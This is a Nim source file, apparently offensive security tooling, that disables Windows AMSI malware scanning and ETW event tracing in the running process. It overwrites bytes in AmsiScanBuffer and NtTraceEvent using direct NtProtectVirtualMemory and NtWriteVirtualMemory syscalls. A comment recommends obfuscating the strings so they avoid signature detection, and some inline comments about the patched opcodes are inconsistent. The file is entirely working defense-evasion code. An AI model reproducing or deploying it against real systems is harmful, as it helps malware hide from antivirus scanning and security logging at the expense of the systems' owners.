

import winim/lean
# nimble install https://github.com/nbaertsch/nimvoke
import nimvoke/syscalls
import ptr_math

# Strings are not encrypted here. TODO: use e.G. "strenc" to obfuscate the strings, as those could be signatured.

proc LdrLoadDll*(PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.
    importc: "LdrLoadDll", dynlib: "ntdll", stdcall, discardable.}

proc PatchAmsi(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[1, byte] = [byte 0x75] # Patch to JNZ, old value was 0x74 (JNZ)
    elif defined i386:
        let patch: array[1, byte] = [byte 0x75]
    
    var ModuleFileName: UNICODE_STRING
    RtlInitUnicodeString(addr(ModuleFileName), "amsi.dll")
    var dllstatus = LdrLoadDll(nil, 0, &ModuleFileName, &amsi)

    if not NT_SUCCESS(dllstatus):
        when defined(verbose):
            echo "[X] Failed to load: amsi.dll"
            return
    else:
        when defined(verbose):
            echo "[+] Loaded: amsi.dll"

    cs = GetProcAddress(amsi,"AmsiScanBuffer")
    
    if isNil(cs):
        when defined(verbose):
            echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled
    
    when defined amd64:
        cs = cs + 0x6D # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
    else:
        cs = cs + 0x47 # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
    
    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    var pHandle: HANDLE = -1
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID
    
    status = syscall(NtProtectVirtualMemory,pHandle,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
    if (status != 0):
        when defined(verbose):
            echo "NtProtectVirtualMemory failed"
        return disabled
    when defined(verbose):
        echo "[*] Applying Syscall AMSI patch"
    
    var outLength: SIZE_T

    status = syscall(NtWriteVirtualMemory,pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)

    if (status != 0):
        when defined(verbose):
            echo "NtWriteVirtualMemory failed"
        return disabled
    
    success =  syscall(NtProtectVirtualMemory,pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
    if (status != 0):
        when defined(verbose):
            echo "NtProtectVirtualMemory failed"
        return disabled
    else:
        when defined(verbose):
            echo "[*] OldProtect set back"
        disabled = true

    return disabled

proc PatchETW(): bool =
    var
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    
    # Get module handle to ntdll.dll
    var ntdll: HMODULE = GetModuleHandle("ntdll.dll")
    
    if(ntdll == 0):
        when defined(verbose):
            echo "[X] Failed to get the handle of 'ntdll.dll'"
        return disabled
    else:
        when defined(verbose):
            echo "[+] Got handle to ntdll.dll"

    cs = GetProcAddress(ntdll,"NtTraceEvent")
    
    if isNil(cs):
        when defined(verbose):
            echo "[X] Failed to get the address of 'NtTraceEvent'"
        return disabled
    else:
        when defined(verbose):
            echo "[+] Got address of NtTraceEvent"

    
    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    var pHandle: HANDLE = -1
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID
    
    status = syscall(NtProtectVirtualMemory,pHandle,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
    if (status != 0):
        when defined(verbose):
            echo "[-] NtProtectVirtualMemory failed"
        return disabled
    when defined(verbose):
        echo "[*] Applying Syscall ETW patch"
    
    var outLength: SIZE_T

    status = syscall(NtWriteVirtualMemory,pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)

    if (status != 0):
        when defined(verbose):
            echo "[-] NtWriteVirtualMemory failed"
        return disabled
    
    success =  syscall(NtProtectVirtualMemory,pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
    if (status != 0):
        when defined(verbose):
            echo "[-] NtProtectVirtualMemory failed"
        return disabled
    else:
        when defined(verbose):
            echo "[*] OldProtect set back"
        disabled = true

    return disabled

var success = PatchETW()
when defined(verbose):
    echo "[*] ETW disabled: ", success

success = PatchAmsi()
when defined(verbose):
    echo "[*] AMSI disabled: ", success
